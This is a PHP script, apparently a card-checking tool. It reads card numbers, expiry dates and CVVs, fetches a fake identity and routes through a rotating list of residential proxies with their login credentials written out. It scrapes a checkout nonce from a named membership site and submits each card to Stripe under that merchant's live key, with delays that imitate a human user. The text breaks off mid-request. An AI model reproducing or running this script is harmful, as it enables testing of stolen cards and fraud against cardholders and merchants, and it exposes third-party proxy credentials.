<?php
// File path to cookie.txt
$cookieFilePath = 'cookie.txt';

// Check if the file exists and delete it
if (file_exists($cookieFilePath)) {
    unlink($cookieFilePath);
}

error_reporting(0);
date_default_timezone_set('Asia/Jakarta');

if ($_SERVER['REQUEST_METHOD'] == "POST") {
    extract($_POST);
} elseif ($_SERVER['REQUEST_METHOD'] == "GET") {
    extract($_GET);
}
session_start();
error_reporting(0);
ini_set('display_errors', 0);

function GetStr($string, $start, $end) {
    $str = explode($start, $string);
    $str = explode($end, $str[1]);
    return $str[0];
}

function random_strings($length_of_string) {
    $str_result = '0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz'; 
    return substr(str_shuffle($str_result),  
    0, $length_of_string); 
}
$rnd = 'wing'.random_strings(7).'';
function inStr($string, $start, $end, $value) {
    $str = explode($start, $string);
    $str = explode($end, $str[$value]);
    return $str[0];
}




function rebootproxys() {
    // Array of proxies
    $proxyList = [
     'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-QjnhkeUNgUVE-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-m37RMoDj6ySJ-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-mNHUdnrU6X3l-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-FQ6TdSBsbWQ6-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-o4hEh3mzWPQg-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-xkEKYeq78ome-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-kneL7YyMXRKS-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-aUNXRYczcIHu-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-xPsA221XBPoG-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-pUG2YeniyauM-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-lXKGslkfk7zh-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-TRzQmBOaePMR-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-iBwNRhwyrBMj-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-goMSlp1kdtGY-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-e24bUsSdFKFO-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-r6hKiZ5VbBzU-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-EEJDRkcL3nlu-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-U91amImzLeSN-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-snDfaXXQ1pRu-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-X2tSyJmYJiMU-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-L5KxxpCxYXw9-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-rJQV7Og7euSg-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-iEpfqBD3EF4A-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-TghX2KYNwAA7-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-kz5NISbT2JQc-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-dDzHOk4hJeHn-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-MeqmIGnpzsBA-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-sNl5hu6IWx2S-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-TcU0c9kPKr6O-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-GRH6B6L7KdtV-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-VL5QE8EbJQiR-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-EDolCEfTXwhu-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-QK0YIZc3hVbg-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-fbjiL7fqxkfb-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-MeybAxtRoZTs-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-PlHTaFxCa5SQ-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-NP9COiCJX9nw-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-19Z0HKawoAhw-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-fhPfVKXLQ7If-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-hNDwLh6Tw82a-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-UiSa8pROH0UR-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-9EjhEJrmlen2-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-CpUT54d43Iqu-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-RVU28mfY7iuK-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-qEk2o6cpukIt-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-HgHsbJ9bWKkp-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-D6H5mcjXnYOv-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-mlAd270a2366-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-efAHM1WHiYhP-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-JqisN23vrzrI-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-T2m4U3PtWiUn-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-NigztH3Q73B0-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-7aHPUXXE2GSL-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-yokHUQpsvJ9o-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-lpbZhiEbDEfb-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-yhWhboebCIjY-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-Xl4Gjg7uveuM-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-ObjBBxJrWmts-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-wNJONAZkkLcc-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-FIaJOxdwFi6s-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-wduXnxXZiq9l-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-iH4WHggZ9syO-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-W5R02u4kcHcG-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-BB0HxbTXA6IN-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-F0GDnj8saYTn-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-NNukQhQdBC3N-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-Gn7BA43V0wo7-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-agVqMA6evnZg-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-O5sjFtBiPasU-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-ibCg2kXGsrDu-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-tX92Xgsfi5tz-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-JyXwyrMhJw3u-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-8279AjgO6YKP-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-edZNi9BOXzAJ-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-yr6c79kT5X63-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-52BRmFTF2Ht6-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-CcD5Dh4mmk2c-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-KwxoyoH1hLWi-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-VAttNusEtlul-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-31Km7CUYTHZ5-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-jBgNCnEOrs6r-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-UFrHFTh3UNCV-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-e2Syz2utYTDn-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-kIRC4sTjBb6K-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-1gDRjKFY2HsQ-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-Kd7Ibq4M5sf4-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-wCFjfcCmFAtp-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-CYB1caazJclN-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-B4E6jROcRy77-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-A7jZDXecNDXX-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-u2g2g3dBPANy-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-tlmaykLiudEE-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-u69z2xNdVGDR-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-7i5BIdaf7qhN-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-Qtu2YMDbWUgv-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-nzSnRAHtYILW-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-bu450zwapV5e-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-wgd2PjqX0SOG-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-eZCDRxUXCl4G-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-YL3vKVW3V4kD-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-ZCx020B5LNAG-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-z60ctIUI4tu1-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-fhGDM7v2KKoK-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-IsVGYs2PHkTo-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-d1ffXN3Bj6F3-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-uGnNNw4npwIi-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-iVPfSXniu5Pf-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-chZbyETgLDXl-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-RVUcvLe9GRO2-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-NUCuiwRPrae8-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-gTDUeFzQhgv0-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-9elRgf5gLa3m-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-I9qKpE1gyP5K-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-lfo0HqBF0Gc8-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-FJhigPOXi4rw-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-5nNuZdns1OgP-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-OadDuUA3Eg0X-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-gWcSPmHy39oM-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-lpMnZAE7yjrb-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-05btWA7IbIjH-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-brmVilHwOUlB-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-VCajHrXEErPM-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-Br9X94bda7Gg-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-WCVJxoEP9i2l-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-GMM2HU2vXbRC-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-jQV7LRXx4GZe-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-rJXpGHHAR6Jl-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-2DrWyOr6TUHP-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-j531ADIjzObM-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-Mxaf5k5BRSyE-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-DbEXRQyPSyQ3-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-dbIZLOb0SUFu-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-tYUnHwI1QOXt-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-RUW3ksRfAszE-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-6A3XsGwowxBU-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-gjQTJ6Ormw3S-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-boRPX1Kedh4W-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-qs6ne5frW9Xx-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-70aJNQe1JQe9-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-fgYJEBEvIJ9E-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-TH0lYwBfiqML-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-nWIcP67cq84G-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-tf8fmTrBNHBW-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-fpdfhcFc5akS-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-iSxGX59gUj5t-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-gziCNbe5nojy-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-Fmp5HCRkBXOQ-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-Dzivm14PZxwd-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-r2bx8Avu6VeN-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-LaxxRVW3oxZZ-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-y6U5xC5OUH2H-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-NeLbdZ0qQoBu-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-156jaAnS3Bje-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-O7wBb3uB10eA-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-sVhkVU6foBgo-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-dcfdql9JnyJN-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-8tGsFibTG5sH-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-EUrYPoGnkpeq-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-lyXvoP5nQm0A-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-UGHQh6N5L0IK-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-yXX8HkchaKLv-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-sPPC3arNCx0X-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-cR4BOjVRACrv-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-kB96Cdb1jHct-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-e1FFalafUcqd-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-ekjNC8xR1so4-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-1J5Ol8GnljaU-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-4jl8tsJkviic-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-WCccny28hQgQ-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-Pcx8ndcAESKh-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-mdV8KTn1qbej-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-lY0Oa2k5ORch-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-n7rMhz8dklBu-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-OgwbBljAsZ1f-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-gdQlmANw0nlP-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-L1UKsf8nNif9-sessTime-1:whntieujru',
'res-ww.lightningproxies.net:9999:ezozlymcjacbobj175161-zone-lightning-session-Xaw2BUbBj6vj-sessTime-1:whntieujru',
    ];
    $myproxy = rand(0, count($proxyList) - 1);
    return $proxyList[$myproxy];
}

function value($str, $find_start, $find_end) {
    $start = @strpos($str, $find_start);
    if ($start === false) {
        return "";
    }
    $length = strlen($find_start);
    $end = strpos(substr($str, $start + $length), $find_end);
    return trim(substr($str, $start + $length, $end));
}

function mod($dividendo, $divisor) {
    return round($dividendo - (floor($dividendo / $divisor) * $divisor));
}


$separa = explode("|", $lista);
$cc = $separa[0];
$mes = $separa[1];
$ano = $separa[2];
$cvv = $separa[3];

// Simulate typing delay between field assignments
$number1 = substr($cc, 0, 4);
$number2 = substr($cc, 4, 4);
$number3 = substr($cc, 8, 4);
$number4 = substr($cc, 12, 4);
$number6 = substr($cc, 0, 6);

// Fetch random user data with delay
$proxy = rebootproxys();
list($proxyIP, $proxyPort, $proxyUser, $proxyPass) = explode(':', $proxy);
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://randomuser.me/api/?nat=us');
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIE, 1);
curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:56.0) Gecko/20100101 Firefox/56.0');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
//curl_setopt($ch, CURLOPT_PROXY, "http://$proxyIP:$proxyPort");
//curl_setopt($ch, CURLOPT_PROXYUSERPWD, "$proxyUser:$proxyPass");
$resposta = curl_exec($ch);
$firstname = value($resposta, '"first":"', '"');
$lastname = value($resposta, '"last":"', '"');
$phone = value($resposta, '"phone":"', '"');
$zip = value($resposta, '"postcode":', ',');
$state = value($resposta, '"state":"', '"');
$email = value($resposta, '"email":"', '"');
$city = value($resposta, '"city":"', '"');
$street = value($resposta, '"street":"', '"');
  // Pause to simulate a break in user action


// Step 1: Fetch the page to get the nonce value
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://www.gomsa.net/membership-account/membership-checkout/');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
$pageContent = curl_exec($ch);
curl_close($ch);

$nonce = GetStr($pageContent, 'name="pmpro_checkout_nonce" value="', '"');

// Submit payment details with delay between fields
$ch = curl_init();
curl_setopt($ch, CURLOPT_URL, 'https://api.stripe.com/v1/payment_methods');
curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ch, CURLOPT_HEADER, 0);
curl_setopt($ch, CURLOPT_HTTPHEADER, array(
    'authority: api.stripe.com',
    'accept: application/json',
    'accept-encoding: gzip, deflate, br, zstd',
    'accept-language: en-US,en;q=0.5',
    'content-type: application/x-www-form-urlencoded',
    'origin: https://js.stripe.com',
    'referer: https://js.stripe.com/',
    'sec-fetch-dest: empty',
    'sec-fetch-mode: cors',
    'sec-fetch-site: same-site',
    'user-agent: ' . $_SERVER['HTTP_USER_AGENT'],
));
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);
curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
curl_setopt($ch, CURLOPT_COOKIEFILE, getcwd() . '/cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, getcwd() . '/cookie.txt');

// Insert simulated delay before posting form data
 sleep(rand(2, 4)); // A longer delay to simulate a pause before submission

curl_setopt($ch, CURLOPT_POSTFIELDS, 'type=card&card[number]='.$cc.'&card[cvc]='.$cvv.'&card[exp_month]='.$mes.'&card[exp_year]='.$ano.'&guid=1f15bfea-18d9-4397-b689-3bf861b1e4178b537e&muid=fe3dce50-21e6-44ff-bc96-c235876752e42f4fd3&sid=19be9646-34a4-4d37-9bb4-7d0447645708f98229&pasted_fields=number&payment_user_agent=stripe.js%2Faa85643f31%3B+stripe-js-v3%2Faa85643f31%3B+split-card-element&referrer=https%3A%2F%2Fwww.doane.us&time_on_page=38960&client_attribution_metadata[client_session_id]=32f18293-6b8b-4af2-b47e-51014a98b627&client_attribution_metadata[merchant_integration_source]=elements&client_attribution_metadata[merchant_integration_subtype]=card-element&client_attribution_metadata[merchant_integration_version]=2017&key=pk_live_1a4WfCRJEoV9QNmww9ovjaR2Drltj9JA3tJEWTBi4Ixmr8t3q5nDIANah1o0SdutQx4lUQykrh9bi3t4dR186AR8P00KY9kjRvX&_stripe_account=acct_168hGFAoD6